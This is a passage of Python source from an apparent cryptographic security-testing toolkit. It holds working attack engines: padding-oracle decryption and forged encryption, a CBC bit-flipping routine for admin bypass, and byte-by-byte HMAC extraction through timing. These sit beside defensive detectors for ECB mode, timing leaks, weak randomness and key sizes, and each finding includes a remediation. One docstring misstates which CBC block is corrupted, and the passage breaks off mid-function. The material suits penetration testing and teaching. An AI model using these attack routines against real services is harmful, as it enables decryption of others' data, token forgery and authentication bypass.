    - Encryption of arbitrary plaintext via oracle
    - Automatic block size detection
    - Parallel oracle queries for speed
    - Adaptive timing for network oracles
    """

    def __init__(self, config: CryptoConfig):
        self.config = config
        self.findings: List[CryptoFinding] = []
        self._stats = {
            "oracle_queries": 0,
            "bytes_decrypted": 0,
            "blocks_decrypted": 0,
        }

    @staticmethod
    def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
        """Apply PKCS#7 padding."""
        padding_len = block_size - (len(data) % block_size)
        return data + bytes([padding_len] * padding_len)

    @staticmethod
    def pkcs7_unpad(data: bytes) -> bytes:
        """Remove PKCS#7 padding."""
        if not data:
            raise ValueError("Empty data")
        padding_len = data[-1]
        if padding_len == 0 or padding_len > len(data):
            raise ValueError(f"Invalid padding length: {padding_len}")
        if data[-padding_len:] != bytes([padding_len] * padding_len):
            raise ValueError("Invalid padding")
        return data[:-padding_len]

    @staticmethod
    def xor_bytes(a: bytes, b: bytes) -> bytes:
        """XOR two byte strings."""
        return bytes(x ^ y for x, y in zip(a, b))

    def detect_block_size(
        self,
        oracle_fn: Callable[[bytes], bool],
        ciphertext: bytes,
    ) -> int:
        """Detect the block size by analyzing ciphertext length patterns."""
        # Common block sizes
        for bs in [16, 8, 32]:
            if len(ciphertext) % bs == 0:
                return bs
        return 16  # Default assumption

    async def decrypt_block(
        self,
        oracle_fn: Callable[[bytes], bool],
        prev_block: bytes,
        target_block: bytes,
        block_size: int = 16,
    ) -> bytes:
        """
        Decrypt a single block using the padding oracle.

        Algorithm:
        1. For each byte position (right to left):
           a. Set padding value = position + 1
           b. Fix previously found intermediate bytes
           c. Try all 256 values for current byte
           d. Correct value produces valid padding
        2. XOR intermediate values with previous block = plaintext
        """
        intermediate = bytearray(block_size)

        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos
            found = False

            # Build the attack block
            attack_block = bytearray(block_size)

            # Set already-discovered bytes to produce correct padding
            for i in range(byte_pos + 1, block_size):
                attack_block[i] = intermediate[i] ^ padding_value

            # Try all 256 values for the current byte
            for guess in range(256):
                attack_block[byte_pos] = guess
                test_cipher = bytes(attack_block) + target_block

                self._stats["oracle_queries"] += 1

                if oracle_fn(test_cipher):
                    # Verify it's not a false positive (for the last byte)
                    if byte_pos == block_size - 1:
                        # Flip a preceding byte to verify
                        verify_block = bytearray(attack_block)
                        if byte_pos > 0:
                            verify_block[byte_pos - 1] ^= 1
                            if not oracle_fn(bytes(verify_block) + target_block):
                                continue

                    intermediate[byte_pos] = guess ^ padding_value
                    found = True
                    break

            if not found:
                logger.warning("Failed to decrypt byte at position %d", byte_pos)
                intermediate[byte_pos] = 0

        # XOR intermediate with previous block to get plaintext
        plaintext = self.xor_bytes(bytes(intermediate), prev_block)
        self._stats["bytes_decrypted"] += block_size
        self._stats["blocks_decrypted"] += 1
        return plaintext

    async def decrypt_ciphertext(
        self,
        oracle_fn: Callable[[bytes], bool],
        ciphertext: bytes,
        block_size: int = 16,
    ) -> bytes:
        """Decrypt an entire ciphertext using the padding oracle."""
        if len(ciphertext) % block_size != 0:
            raise ValueError("Ciphertext length must be a multiple of block size")

        num_blocks = len(ciphertext) // block_size
        if num_blocks < 2:
            raise ValueError("Need at least 2 blocks (IV + ciphertext)")

        blocks = [
            ciphertext[i * block_size : (i + 1) * block_size] for i in range(num_blocks)
        ]

        plaintext = b""
        for i in range(1, num_blocks):
            block_pt = await self.decrypt_block(
                oracle_fn, blocks[i - 1], blocks[i], block_size
            )
            plaintext += block_pt
            logger.info("Decrypted block %d/%d", i, num_blocks - 1)

        # Remove padding
        try:
            plaintext = self.pkcs7_unpad(plaintext)
        except ValueError:
            logger.warning("Invalid padding in decrypted data — returning raw")

        return plaintext

    async def encrypt_plaintext(
        self,
        oracle_fn: Callable[[bytes], bool],
        plaintext: bytes,
        block_size: int = 16,
    ) -> bytes:
        """
        Encrypt arbitrary plaintext using the padding oracle.
        Works by computing intermediate values and XORing with desired plaintext.
        """
        padded = self.pkcs7_pad(plaintext, block_size)
        num_blocks = len(padded) // block_size

        # Start from the last block with a random IV
        ciphertext_blocks = [os.urandom(block_size)]

        for block_idx in range(num_blocks - 1, -1, -1):
            target_pt = padded[block_idx * block_size : (block_idx + 1) * block_size]

            # Find intermediate values for the current ciphertext block
            intermediate = bytearray(block_size)
            current_ct = ciphertext_blocks[0]

            for byte_pos in range(block_size - 1, -1, -1):
                padding_value = block_size - byte_pos
                attack_block = bytearray(block_size)

                for i in range(byte_pos + 1, block_size):
                    attack_block[i] = intermediate[i] ^ padding_value

                for guess in range(256):
                    attack_block[byte_pos] = guess
                    test = bytes(attack_block) + current_ct
                    self._stats["oracle_queries"] += 1

                    if oracle_fn(test):
                        intermediate[byte_pos] = guess ^ padding_value
                        break

            # XOR intermediate with desired plaintext to get previous ciphertext block
            prev_ct = self.xor_bytes(bytes(intermediate), target_pt)
            ciphertext_blocks.insert(0, prev_ct)

        return b"".join(ciphertext_blocks)

    def detect_padding_oracle(
        self,
        response_valid: Any,
        response_invalid_padding: Any,
        response_invalid_data: Any,
    ) -> Optional[CryptoFinding]:
        """Detect if a padding oracle exists based on response differences."""
        # Compare responses for different error conditions
        has_oracle = False
        evidence_parts = []

        # Check if invalid padding gives a different response than invalid data
        if response_invalid_padding != response_invalid_data:
            has_oracle = True
            evidence_parts.append(
                "Different responses for invalid padding vs invalid decrypted data"
            )

        # Check timing differences
        if hasattr(response_valid, "elapsed") and hasattr(
            response_invalid_padding, "elapsed"
        ):
            time_diff = abs(
                getattr(response_valid, "elapsed", 0)
                - getattr(response_invalid_padding, "elapsed", 0)
            )
            if time_diff > self.config.timing_threshold_ms:
                has_oracle = True
                evidence_parts.append(f"Timing difference: {time_diff:.2f}ms")

        if has_oracle:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.PADDING_ORACLE,
                severity=CryptoSeverity.CRITICAL,
                title="Padding Oracle Detected",
                description=(
                    "The application reveals whether CBC padding is valid or not, "
                    "enabling a Padding Oracle attack. This allows decryption and "
                    "encryption of arbitrary data without the key."
                ),
                evidence="\n".join(evidence_parts),
                impact=(
                    "Full plaintext recovery of encrypted data. "
                    "Forgery of encrypted messages. "
                    "Authentication bypass if encrypted tokens are used."
                ),
                remediation=(
                    "1. Use authenticated encryption (AES-GCM, ChaCha20-Poly1305)\n"
                    "2. Use constant-time padding validation\n"
                    "3. Return identical errors for all decryption failures\n"
                    "4. Implement encrypt-then-MAC"
                ),
                cvss_score=9.1,
                cwe_id="CWE-209",
            )
            self.findings.append(finding)
            return finding
        return None


# =========================================================================
#  ECB DETECTION ENGINE
# =========================================================================


class ECBDetector:
    """
    Detect ECB (Electronic Codebook) mode encryption.

    ECB mode encrypts identical plaintext blocks to identical ciphertext blocks,
    which leaks information about the plaintext structure.

    Detection methods:
    - Block repetition analysis
    - Chosen-plaintext probing (when possible)
    - Statistical analysis of ciphertext entropy
    - Visual pattern detection (for image data)
    """

    def __init__(self):
        self.findings: List[CryptoFinding] = []

    def detect_ecb_repetitions(
        self,
        ciphertext: bytes,
        block_size: int = 16,
    ) -> Optional[CryptoFinding]:
        """Detect ECB mode by looking for repeated ciphertext blocks."""
        if len(ciphertext) < block_size * 2:
            return None

        blocks = [
            ciphertext[i : i + block_size]
            for i in range(0, len(ciphertext) - block_size + 1, block_size)
        ]

        # Count block frequencies
        block_counts = Counter(blocks)
        repeated = {
            block.hex(): count for block, count in block_counts.items() if count > 1
        }

        if repeated:
            total_blocks = len(blocks)
            unique_blocks = len(block_counts)
            repetition_ratio = 1.0 - (unique_blocks / total_blocks)

            finding = CryptoFinding(
                attack_type=CryptoAttackType.ECB_DETECTION,
                severity=CryptoSeverity.HIGH,
                title="ECB Mode Encryption Detected",
                description=(
                    f"Detected {len(repeated)} repeated ciphertext blocks out of "
                    f"{total_blocks} total blocks (block size: {block_size}). "
                    "This indicates ECB mode encryption which leaks information."
                ),
                evidence=(
                    f"Total blocks: {total_blocks}\n"
                    f"Unique blocks: {unique_blocks}\n"
                    f"Repetition ratio: {repetition_ratio:.2%}\n"
                    f"Repeated blocks: {json.dumps(repeated, indent=2)}"
                ),
                impact=(
                    "Information leakage about plaintext structure. "
                    "Image data reveals shapes. Database field values can be matched. "
                    "Known-plaintext attacks become trivial."
                ),
                remediation=(
                    "1. Use CBC, CTR, or GCM mode instead of ECB\n"
                    "2. Use authenticated encryption (AES-GCM preferred)\n"
                    "3. Ensure unique IVs/nonces for each encryption"
                ),
                cvss_score=7.5,
                cwe_id="CWE-327",
                metadata={
                    "total_blocks": total_blocks,
                    "unique_blocks": unique_blocks,
                    "repetition_ratio": repetition_ratio,
                    "repeated_blocks": repeated,
                },
            )
            self.findings.append(finding)
            return finding
        return None

    def detect_ecb_chosen_plaintext(
        self,
        encrypt_fn: Callable[[bytes], bytes],
        block_size: int = 16,
    ) -> Optional[CryptoFinding]:
        """
        Detect ECB mode using chosen-plaintext attack.
        Send two identical blocks and check if ciphertext blocks match.
        """
        # Create plaintext with two identical blocks
        test_block = b"A" * block_size
        test_plaintext = test_block * 3  # 3 identical blocks

        ciphertext = encrypt_fn(test_plaintext)
        blocks = [
            ciphertext[i : i + block_size]
            for i in range(0, len(ciphertext), block_size)
        ]

        # In ECB mode, at least 2 consecutive blocks should be identical
        for i in range(len(blocks) - 1):
            if blocks[i] == blocks[i + 1]:
                finding = CryptoFinding(
                    attack_type=CryptoAttackType.ECB_DETECTION,
                    severity=CryptoSeverity.HIGH,
                    title="ECB Mode Confirmed (Chosen-Plaintext)",
                    description=(
                        "Confirmed ECB mode via chosen-plaintext attack. "
                        "Identical input blocks produce identical output blocks."
                    ),
                    evidence=f"Matching blocks at positions {i} and {i+1}: {blocks[i].hex()}",
                    impact="Full plaintext structure leakage. Block manipulation possible.",
                    remediation="Switch to authenticated encryption (AES-GCM).",
                    cvss_score=7.5,
                    cwe_id="CWE-327",
                )
                self.findings.append(finding)
                return finding
        return None

    def analyze_entropy(
        self, ciphertext: bytes, block_size: int = 16
    ) -> Dict[str, Any]:
        """Analyze the entropy of ciphertext to detect ECB characteristics."""
        if len(ciphertext) < block_size:
            return {"entropy": 0, "is_ecb_likely": False}

        blocks = [
            ciphertext[i : i + block_size]
            for i in range(0, len(ciphertext) - block_size + 1, block_size)
        ]

        # Shannon entropy of blocks
        block_counts = Counter(blocks)
        total = len(blocks)
        entropy = 0.0
        for count in block_counts.values():
            if count > 0:
                p = count / total
                entropy -= p * math.log2(p)

        max_entropy = math.log2(total) if total > 0 else 0
        normalized_entropy = entropy / max_entropy if max_entropy > 0 else 0

        # Byte-level entropy
        byte_counts = Counter(ciphertext)
        byte_entropy = 0.0
        for count in byte_counts.values():
            p = count / len(ciphertext)
            byte_entropy -= p * math.log2(p)

        return {
            "block_entropy": entropy,
            "max_block_entropy": max_entropy,
            "normalized_block_entropy": normalized_entropy,
            "byte_entropy": byte_entropy,
            "max_byte_entropy": 8.0,
            "unique_blocks": len(block_counts),
            "total_blocks": total,
            "is_ecb_likely": normalized_entropy < 0.95 and total > 4,
        }


# =========================================================================
#  CBC BIT-FLIPPING ATTACK
# =========================================================================


class CBCBitFlipEngine:
    """
    CBC Bit-Flipping attack engine.

    In CBC mode, flipping bit N in ciphertext block C[i] will:
    - Corrupt the plaintext of block P[i+1] at position N
    - Flip the corresponding bit in P[i+1] but garbage block P[i]

    This allows precise manipulation of decrypted values when
    the plaintext structure is known.
    """

    def __init__(self):
        self.findings: List[CryptoFinding] = []

    def calculate_flip_mask(
        self,
        original_byte: int,
        target_byte: int,
    ) -> int:
        """Calculate the XOR mask to flip a byte from original to target."""
        return original_byte ^ target_byte

    def flip_ciphertext(
        self,
        ciphertext: bytes,
        block_size: int,
        target_block_index: int,
        byte_offset: int,
        original_value: int,
        target_value: int,
    ) -> bytes:
        """
        Modify ciphertext to change a specific plaintext byte.

        To change P[target_block_index][byte_offset] from original_value to target_value,
        we XOR C[target_block_index - 1][byte_offset] with the flip mask.
        """
        if target_block_index < 1:
            raise ValueError("Cannot flip in the first block (would need to modify IV)")

        flip_mask = self.calculate_flip_mask(original_value, target_value)
        modify_index = (target_block_index - 1) * block_size + byte_offset

        result = bytearray(ciphertext)
        result[modify_index] ^= flip_mask
        return bytes(result)

    def generate_admin_bypass(
        self,
        ciphertext: bytes,
        block_size: int,
        known_plaintext: str,
        target_string: str,
        replacement_string: str,
    ) -> Optional[bytes]:
        """
        Generate modified ciphertext to bypass admin checks.

        Example: Change ";admin=false;" to ";admin=true;X"
        """
        known_bytes = known_plaintext.encode("utf-8")
        target_bytes = target_string.encode("utf-8")
        replacement_bytes = replacement_string.encode("utf-8")

        if len(target_bytes) != len(replacement_bytes):
            # Pad replacement to match length
            if len(replacement_bytes) < len(target_bytes):
                replacement_bytes = replacement_bytes + b"\x00" * (
                    len(target_bytes) - len(replacement_bytes)
                )
            else:
                replacement_bytes = replacement_bytes[: len(target_bytes)]

        # Find the target string in the known plaintext
        offset = known_bytes.find(target_bytes)
        if offset < 0:
            logger.warning("Target string not found in known plaintext")
            return None

        # Determine which block(s) the target spans
        start_block = offset // block_size
        result = bytearray(ciphertext)

        for i in range(len(target_bytes)):
            abs_offset = offset + i
            block_idx = abs_offset // block_size
            byte_in_block = abs_offset % block_size

            if target_bytes[i] != replacement_bytes[i]:
                # Modify the previous ciphertext block
                modify_pos = (block_idx) * block_size + byte_in_block
                if modify_pos < len(result) and block_idx > 0:
                    # Actually modify block_idx - 1 to affect block_idx
                    modify_pos = (block_idx - 1) * block_size + byte_in_block
                    flip = target_bytes[i] ^ replacement_bytes[i]
                    result[modify_pos] ^= flip

        finding = CryptoFinding(
            attack_type=CryptoAttackType.CBC_BIT_FLIP,
            severity=CryptoSeverity.CRITICAL,
            title="CBC Bit-Flipping: Plaintext Manipulation",
            description=(
                f"Modified ciphertext to change '{target_string}' to "
                f"'{replacement_string}' in the decrypted output."
            ),
            evidence=(
                f"Original: {target_string}\n"
                f"Modified: {replacement_string}\n"
                f"Offset: {offset}\n"
                f"Block: {start_block}"
            ),
            impact="Arbitrary plaintext manipulation without knowing the key.",
            remediation=(
                "1. Use authenticated encryption (AES-GCM, ChaCha20-Poly1305)\n"
                "2. Apply MAC before decryption (encrypt-then-MAC)\n"
                "3. Use HMAC to verify integrity of ciphertext"
            ),
            cvss_score=9.1,
            cwe_id="CWE-327",
            metadata={
                "original": target_string,
                "replacement": replacement_string,
                "offset": offset,
                "block": start_block,
            },
        )
        self.findings.append(finding)
        return bytes(result)


# =========================================================================
#  TIMING ATTACK ENGINE
# =========================================================================


class TimingAttackEngine:
    """
    Timing-based side-channel attack engine.

    Exploits time differences in cryptographic operations to
    extract secrets byte-by-byte.

    Capabilities:
    - HMAC timing analysis (string comparison leaks)
    - Password comparison timing
    - Token validation timing
    - Statistical significance testing
    - Noise filtering and outlier removal
    - Adaptive sampling
    """

    def __init__(self, config: CryptoConfig):
        self.config = config
        self.findings: List[CryptoFinding] = []

    @staticmethod
    def _measure_time(fn: Callable[[], Any], iterations: int = 100) -> List[float]:
        """Measure execution time over multiple iterations."""
        timings = []
        for _ in range(iterations):
            start = time.perf_counter_ns()
            fn()
            end = time.perf_counter_ns()
            timings.append((end - start) / 1_000_000)  # Convert to ms
        return timings

    @staticmethod
    def _remove_outliers(data: List[float], factor: float = 1.5) -> List[float]:
        """Remove outliers using IQR method."""
        if len(data) < 4:
            return data
        sorted_data = sorted(data)
        q1_idx = len(sorted_data) // 4
        q3_idx = 3 * len(sorted_data) // 4
        q1 = sorted_data[q1_idx]
        q3 = sorted_data[q3_idx]
        iqr = q3 - q1
        lower = q1 - factor * iqr
        upper = q3 + factor * iqr
        return [x for x in data if lower <= x <= upper]

    @staticmethod
    def _mean(data: List[float]) -> float:
        return sum(data) / len(data) if data else 0

    @staticmethod
    def _std_dev(data: List[float]) -> float:
        if len(data) < 2:
            return 0
        mean = sum(data) / len(data)
        variance = sum((x - mean) ** 2 for x in data) / (len(data) - 1)
        return math.sqrt(variance)

    def detect_timing_leak(
        self,
        fn_correct: Callable[[], Any],
        fn_wrong_first_byte: Callable[[], Any],
        fn_wrong_last_byte: Callable[[], Any],
    ) -> Optional[CryptoFinding]:
        """
        Detect if a comparison function leaks timing information.

        If wrong-first-byte is faster than wrong-last-byte, the comparison
        is not constant-time and leaks the position of the first difference.
        """
        n = self.config.timing_samples

        t_correct = self._remove_outliers(self._measure_time(fn_correct, n))
        t_wrong_first = self._remove_outliers(
            self._measure_time(fn_wrong_first_byte, n)
        )
        t_wrong_last = self._remove_outliers(self._measure_time(fn_wrong_last_byte, n))

        mean_correct = self._mean(t_correct)
        mean_wrong_first = self._mean(t_wrong_first)
        mean_wrong_last = self._mean(t_wrong_last)

        # Check for timing differences
        diff_first_last = abs(mean_wrong_last - mean_wrong_first)
        diff_correct_wrong = abs(mean_correct - mean_wrong_first)

        threshold = self.config.timing_threshold_ms

        is_vulnerable = False
        evidence_parts = []

        if diff_first_last > threshold:
            is_vulnerable = True
            evidence_parts.append(
                f"Wrong-first vs Wrong-last difference: {diff_first_last:.4f}ms "
                f"(threshold: {threshold}ms)"
            )

        if diff_correct_wrong > threshold:
            is_vulnerable = True
            evidence_parts.append(
                f"Correct vs Wrong difference: {diff_correct_wrong:.4f}ms"
            )

        if mean_wrong_last > mean_wrong_first * 1.1:  # 10% difference
            is_vulnerable = True
            evidence_parts.append(
                f"Timing gradient detected: wrong-first={mean_wrong_first:.4f}ms, "
                f"wrong-last={mean_wrong_last:.4f}ms "
                f"(ratio: {mean_wrong_last/mean_wrong_first:.3f}x)"
            )

        if is_vulnerable:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.TIMING_ATTACK,
                severity=CryptoSeverity.HIGH,
                title="Timing Side-Channel Vulnerability",
                description=(
                    "The comparison function leaks timing information that reveals "
                    "how many bytes of the input are correct. An attacker can recover "
                    "secrets one byte at a time."
                ),
                evidence="\n".join(evidence_parts),
                impact=(
                    "Secret recovery via timing analysis. HMAC validation bypass. "
                    "Password extraction. Token prediction."
                ),
                remediation=(
                    "1. Use hmac.compare_digest() for Python\n"
                    "2. Use crypto.timingSafeEqual() for Node.js\n"
                    "3. Use MessageDigest.isEqual() for Java\n"
                    "4. Implement constant-time comparison manually if needed"
                ),
                cvss_score=7.5,
                cwe_id="CWE-208",
                metadata={
                    "mean_correct_ms": mean_correct,
                    "mean_wrong_first_ms": mean_wrong_first,
                    "mean_wrong_last_ms": mean_wrong_last,
                    "diff_first_last_ms": diff_first_last,
                    "samples": n,
                },
            )
            self.findings.append(finding)
            return finding
        return None

    async def extract_hmac_byte_by_byte(
        self,
        oracle_fn: Callable[[bytes], float],
        known_prefix: bytes,
        target_length: int,
        charset: Optional[bytes] = None,
    ) -> bytes:
        """
        Extract HMAC value byte-by-byte using timing differences.

        oracle_fn takes a candidate HMAC and returns the response time.
        """
        if charset is None:
            charset = bytes(range(256))

        extracted = bytearray(known_prefix)

        for pos in range(len(known_prefix), target_length):
            best_byte = 0
            best_time = 0.0

            for byte_val in charset:
                candidate = (
                    bytes(extracted)
                    + bytes([byte_val])
                    + b"\x00" * (target_length - pos - 1)
                )

                # Average multiple measurements
                timings = []
                for _ in range(self.config.timing_samples):
                    t = oracle_fn(candidate)
                    timings.append(t)

                clean_timings = self._remove_outliers(timings)
                avg_time = self._mean(clean_timings)

                if avg_time > best_time:
                    best_time = avg_time
                    best_byte = byte_val

            extracted.append(best_byte)
            logger.info(
                "Extracted byte %d/%d: 0x%02x (timing: %.4fms)",
                pos + 1,
                target_length,
                best_byte,
                best_time,
            )

        return bytes(extracted)


# =========================================================================
#  CRYPTOGRAPHIC RANDOMNESS ANALYZER
# =========================================================================


class RandomnessAnalyzer:
    """
    Analyze cryptographic randomness quality.

    Tests:
    - Frequency (monobit) test
    - Runs test
    - Block frequency test
    - Serial test
    - Entropy estimation
    - Chi-squared test
    - Pattern detection
    - Predictability assessment for tokens/session IDs
    """

    def __init__(self):
        self.findings: List[CryptoFinding] = []

    @staticmethod
    def _bytes_to_bits(data: bytes) -> List[int]:
        """Convert bytes to bit array."""
        bits = []
        for byte in data:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)
        return bits

    def frequency_test(self, data: bytes) -> Dict[str, Any]:
        """NIST SP 800-22 Frequency (Monobit) Test."""
        bits = self._bytes_to_bits(data)
        n = len(bits)
        if n == 0:
            return {"passed": False, "p_value": 0, "explanation": "No data"}

        s = sum(2 * b - 1 for b in bits)  # Convert 0,1 to -1,+1
        s_obs = abs(s) / math.sqrt(n)

        # Compute p-value using complementary error function approximation
        p_value = math.erfc(s_obs / math.sqrt(2))

        return {
            "test": "frequency",
            "passed": p_value >= 0.01,
            "p_value": p_value,
            "s_obs": s_obs,
            "ones_count": sum(bits),
            "zeros_count": n - sum(bits),
            "ratio": sum(bits) / n if n > 0 else 0,
        }

    def runs_test(self, data: bytes) -> Dict[str, Any]:
        """NIST SP 800-22 Runs Test — test for oscillation."""
        bits = self._bytes_to_bits(data)
        n = len(bits)
        if n < 100:
            return {
                "passed": False,
                "p_value": 0,
                "explanation": "Need at least 100 bits",
            }

        pi = sum(bits) / n

        # Pre-test: frequency should be close to 0.5
        if abs(pi - 0.5) >= 2 / math.sqrt(n):
            return {
                "passed": False,
                "p_value": 0,
                "explanation": "Failed frequency pre-test",
            }

        # Count runs
        runs = 1
        for i in range(1, n):
            if bits[i] != bits[i - 1]:
                runs += 1

        # Expected runs
        expected = 1 + 2 * n * pi * (1 - pi)
        std = 2 * math.sqrt(2 * n) * pi * (1 - pi)

        if std == 0:
            return {"passed": False, "p_value": 0}

        z = abs(runs - expected) / std
        p_value = math.erfc(z / math.sqrt(2))

        return {
            "test": "runs",
            "passed": p_value >= 0.01,
            "p_value": p_value,
            "runs": runs,
            "expected_runs": expected,
            "z_score": z,
        }

    def chi_squared_test(self, data: bytes) -> Dict[str, Any]:
        """Chi-squared test for byte distribution uniformity."""
        if len(data) < 256:
            return {
                "passed": False,
                "p_value": 0,
                "explanation": "Need at least 256 bytes",
            }

        observed = Counter(data)
        expected = len(data) / 256.0

        chi_sq = sum(
            (observed.get(i, 0) - expected) ** 2 / expected for i in range(256)
        )

        # Degrees of freedom = 255
        # Approximate p-value (simplified)
        dof = 255
        # Using Wilson-Hilferty approximation
        z = ((chi_sq / dof) ** (1 / 3) - (1 - 2 / (9 * dof))) / math.sqrt(2 / (9 * dof))
        p_value = 0.5 * math.erfc(z / math.sqrt(2))

        return {
            "test": "chi_squared",
            "passed": p_value >= 0.01,
            "p_value": p_value,
            "chi_squared": chi_sq,
            "degrees_of_freedom": dof,
            "unique_bytes": len(observed),
        }

    def entropy_estimation(self, data: bytes) -> Dict[str, Any]:
        """Estimate Shannon entropy of the data."""
        if not data:
            return {"entropy": 0, "max_entropy": 0, "ratio": 0}

        counts = Counter(data)
        n = len(data)
        entropy = 0.0
        for count in counts.values():
            if count > 0:
                p = count / n
                entropy -= p * math.log2(p)

        max_entropy = 8.0  # Maximum for byte data
        return {
            "entropy_per_byte": entropy,
            "max_entropy": max_entropy,
            "ratio": entropy / max_entropy,
            "total_entropy_bits": entropy * n,
            "unique_values": len(counts),
            "data_length": n,
            "is_good": entropy > 7.0,
        }

    def pattern_detection(self, data: bytes) -> Dict[str, Any]:
        """Detect repeating patterns in the data."""
        patterns_found = []

        # Check for repeating byte sequences
        for pattern_len in range(1, min(32, len(data) // 2)):
            pattern = data[:pattern_len]
            matches = 0
            for i in range(0, len(data) - pattern_len + 1, pattern_len):
                if data[i : i + pattern_len] == pattern:
                    matches += 1

            expected_matches = len(data) // pattern_len
            if matches > expected_matches * 0.9 and expected_matches > 2:
                patterns_found.append(
                    {
                        "pattern": pattern.hex(),
                        "length": pattern_len,
                        "matches": matches,
                        "coverage": matches * pattern_len / len(data),
                    }
                )

        # Check for incrementing sequences
        increments = [data[i + 1] - data[i] for i in range(len(data) - 1)]
        increment_counts = Counter(increments)
        most_common_inc, most_common_count = (
            increment_counts.most_common(1)[0] if increment_counts else (0, 0)
        )

        is_sequential = most_common_count > len(data) * 0.8

        return {
            "patterns": patterns_found,
            "is_sequential": is_sequential,
            "most_common_increment": most_common_inc,
            "increment_frequency": most_common_count / len(data) if data else 0,
            "is_random": len(patterns_found) == 0 and not is_sequential,
        }

    def analyze_tokens(self, tokens: List[str]) -> Optional[CryptoFinding]:
        """Analyze a set of tokens/session IDs for randomness quality."""
        if len(tokens) < 10:
            return None

        # Concatenate all tokens as bytes
        try:
            all_bytes = b"".join(
                (
                    bytes.fromhex(t)
                    if all(c in string.hexdigits for c in t)
                    else t.encode()
                )
                for t in tokens
            )
        except Exception:
            all_bytes = b"".join(t.encode() for t in tokens)

        freq_result = self.frequency_test(all_bytes)
        runs_result = self.runs_test(all_bytes)
        chi_result = self.chi_squared_test(all_bytes)
        entropy_result = self.entropy_estimation(all_bytes)
        pattern_result = self.pattern_detection(all_bytes)

        issues = []
        if not freq_result.get("passed", True):
            issues.append(
                f"Failed frequency test (p={freq_result.get('p_value', 0):.6f})"
            )
        if not runs_result.get("passed", True):
            issues.append(f"Failed runs test (p={runs_result.get('p_value', 0):.6f})")
        if not chi_result.get("passed", True):
            issues.append(
                f"Failed chi-squared test (p={chi_result.get('p_value', 0):.6f})"
            )
        if not entropy_result.get("is_good", True):
            issues.append(
                f"Low entropy: {entropy_result.get('entropy_per_byte', 0):.2f}/8.0 bits"
            )
        if not pattern_result.get("is_random", True):
            issues.append("Patterns detected in token data")

        if issues:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.WEAK_RANDOM,
                severity=(
                    CryptoSeverity.HIGH if len(issues) >= 3 else CryptoSeverity.MEDIUM
                ),
                title="Weak Cryptographic Randomness in Tokens",
                description=(
                    f"Analysis of {len(tokens)} tokens revealed weak randomness. "
                    f"Issues: {'; '.join(issues)}"
                ),
                evidence=(
                    f"Tokens analyzed: {len(tokens)}\n"
                    f"Entropy: {entropy_result.get('entropy_per_byte', 0):.2f}/8.0 bits\n"
                    f"Frequency test: {'PASS' if freq_result.get('passed') else 'FAIL'}\n"
                    f"Runs test: {'PASS' if runs_result.get('passed') else 'FAIL'}\n"
                    f"Chi-squared: {'PASS' if chi_result.get('passed') else 'FAIL'}\n"
                    f"Patterns: {'NONE' if pattern_result.get('is_random') else 'FOUND'}"
                ),
                impact=(
                    "Token prediction. Session hijacking. "
                    "CSRF token bypass. Password reset token prediction."
                ),
                remediation=(
                    "1. Use os.urandom() or secrets module in Python\n"
                    "2. Use crypto.randomBytes() in Node.js\n"
                    "3. Use SecureRandom in Java\n"
                    "4. Never use Math.random() or time-based seeds for security tokens"
                ),
                cvss_score=8.1 if len(issues) >= 3 else 5.3,
                cwe_id="CWE-330",
                metadata={
                    "frequency_test": freq_result,
                    "runs_test": runs_result,
                    "chi_squared_test": chi_result,
                    "entropy": entropy_result,
                    "patterns": pattern_result,
                },
            )
            self.findings.append(finding)
            return finding
        return None


# =========================================================================
#  KEY STRENGTH ANALYZER
# =========================================================================


class KeyStrengthAnalyzer:
    """
    Analyze cryptographic key strength and configuration.

    Checks:
    - Key size adequacy (RSA, ECC, symmetric)
    - Key derivation function strength
    - Password-based key derivation parameters
    - Key reuse detection
    - Hardcoded key detection in source code
    """

    MINIMUM_KEY_SIZES = {
        "RSA": 2048,
        "DSA": 2048,
        "ECDSA": 256,
        "ECDH": 256,
        "Ed25519": 256,
        "Ed448": 448,
        "AES": 128,
        "ChaCha20": 256,
        "3DES": 168,  # Effective 112
        "DES": 56,
        "Blowfish": 128,
        "RC4": 128,
    }

    RECOMMENDED_KEY_SIZES = {
        "RSA": 4096,
        "DSA": 3072,
        "ECDSA": 384,
        "ECDH": 384,
        "AES": 256,
        "ChaCha20": 256,
    }

    def __init__(self):
        self.findings: List[CryptoFinding] = []

    def check_key_size(self, algorithm: str, key_size: int) -> Optional[CryptoFinding]:
        """Check if a key size meets minimum security requirements."""
        min_size = self.MINIMUM_KEY_SIZES.get(algorithm.upper(), 128)
        rec_size = self.RECOMMENDED_KEY_SIZES.get(algorithm.upper(), min_size)

        if key_size < min_size:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.WEAK_KEY_SIZE,
                severity=(
                    CryptoSeverity.CRITICAL
                    if key_size < min_size // 2
                    else CryptoSeverity.HIGH
                ),
                title=f"Critically Weak Key Size: {algorithm} {key_size}-bit",
                description=(
                    f"The {algorithm} key size of {key_size} bits is below the minimum "
                    f"recommended size of {min_size} bits. This key can be broken with "
                    f"modern hardware."
                ),
                evidence=f"Algorithm: {algorithm}\nKey size: {key_size} bits\nMinimum: {min_size} bits",
                impact="Key can be factored/computed by an attacker. All encrypted data is compromised.",
                remediation=f"Use at least {rec_size}-bit keys for {algorithm}.",
                cvss_score=9.1 if key_size < min_size // 2 else 7.5,
                cwe_id="CWE-326",
                metadata={
                    "algorithm": algorithm,
                    "key_size": key_size,
                    "minimum": min_size,
                },
            )
            self.findings.append(finding)
            return finding

        elif key_size < rec_size:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.WEAK_KEY_SIZE,
                severity=CryptoSeverity.LOW,
                title=f"Below-Recommended Key Size: {algorithm} {key_size}-bit",
                description=(
                    f"The {algorithm} key size of {key_size} bits meets minimum requirements "
                    f"but is below the recommended size of {rec_size} bits."
                ),
                evidence=f"Algorithm: {algorithm}\nKey size: {key_size}\nRecommended: {rec_size}",
                impact="May not provide adequate security margin for long-term protection.",
                remediation=f"Consider upgrading to {rec_size}-bit keys.",
                cvss_score=2.0,
                cwe_id="CWE-326",
            )
            self.findings.append(finding)
            return finding

        return None

    def detect_hardcoded_keys(self, source_code: str) -> List[CryptoFinding]:
        """Detect hardcoded cryptographic keys in source code."""
        findings = []

        patterns = [
            # Hex keys
